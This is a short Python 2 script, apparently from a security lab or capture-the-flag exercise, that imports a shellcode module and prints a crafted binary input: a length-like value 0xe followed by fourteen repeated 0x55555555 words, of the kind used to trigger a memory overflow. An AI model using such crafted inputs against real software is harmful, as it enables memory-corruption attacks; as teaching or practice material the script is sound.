from shellcode import shellcode
from struct import pack

print pack("<I", 0xe) + pack("<I", 0x55555555)*14
